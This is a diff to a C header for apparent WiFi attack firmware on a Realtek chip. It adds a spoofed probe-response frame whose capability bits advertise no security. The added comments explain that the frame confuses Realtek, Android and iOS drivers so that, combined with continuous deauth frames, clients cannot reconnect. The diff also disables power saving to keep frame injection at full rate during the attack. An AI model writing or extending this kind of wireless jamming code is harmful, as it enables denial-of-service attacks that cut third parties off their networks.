@@ -117,14 +117,50 @@ typedef struct {
 } NullDataFrame;
 
 /*
- * Import the needed c functions from the closed-source libraries
- * The function definitions might not be 100% accurate with the arguments as the types get lost during compilation and cannot be retrieved back during decompilation
- * However, these argument types seem to work perfect
-*/
+ * Probe Response frame (0x0050) with NO security capabilities.
+ *
+ * Realtek/TP-Link USB driver attack:
+ *   Realtek drivers update their internal AP profile when they receive a probe
+ *   response from a known BSSID. Sending a fake probe response with:
+ *     - capabilities = 0x0001 (ESS only, no WPA/WPA2/WPA3 flags)
+ *   makes the driver believe the AP suddenly dropped all security.
+ *   The driver then disconnects and tries to re-negotiate — during which we keep
+ *   sending deauth, making the adapter unable to complete reconnection.
+ *
+ * Also effective against:
+ *   - Android: some Qualcomm/MediaTek drivers honour probe responses for roaming
+ *   - iOS: confuses background scanning logic mid-reconnect
+ */
+typedef struct {
+  uint16_t frame_control   = 0x0050; // Management, Probe Response
+  uint16_t duration        = 0xFFFF;
+  uint8_t  destination[6];           // broadcast
+  uint8_t  source[6];                // AP BSSID (spoofed)
+  uint8_t  access_point[6];          // AP BSSID
+  uint16_t sequence_number = 0;
+  uint64_t timestamp       = 0;
+  uint16_t beacon_interval = 0x0064;
+  uint16_t capabilities    = 0x0001; // ESS only — NO Privacy/WPA/RSN bits
+  uint8_t  ssid_tag        = 0x00;
+  uint8_t  ssid_length     = 0;
+  uint8_t  ssid[32];                 // Filled at runtime; transmit only ssid_length bytes
+} ProbeRespFrame;
+
+/*
+ * Realtek closed-source driver internals — frame injection
+ */
 extern uint8_t* rltk_wlan_info;
 extern "C" void* alloc_mgtxmitframe(void* ptr);
 extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
 extern "C" int dump_mgntframe(void* ptr, void* frame_control);
+
+/*
+ * Performance tuning — called once in setup() after WiFi.apbegin().
+ * Disables IPS (Inactive Power Save) + LPS (Legacy Power Save) on the RF front-end.
+ * Without this the driver throttles TX during perceived idle periods even when
+ * FRAME_DELAY_MS = 0, causing invisible frame rate drops mid-attack.
+ */
+extern "C" int wifi_disable_powersave(void);
 
 void wifi_tx_raw_frame(void* frame, size_t length);
 void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x02);
@@ -133,6 +169,7 @@ void wifi_tx_auth_frame(void* ap_mac, void* fake_client_mac);
 void wifi_tx_assoc_frame(void* ap_mac, void* fake_client_mac);
 void wifi_tx_csa_frame(void* ap_mac, uint8_t new_channel);
 void wifi_tx_null_frame(void* ap_mac, void* fake_client_mac);
+void wifi_tx_probe_resp_frame(void* ap_mac, const char* ssid);
 void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid);
 
 #endif
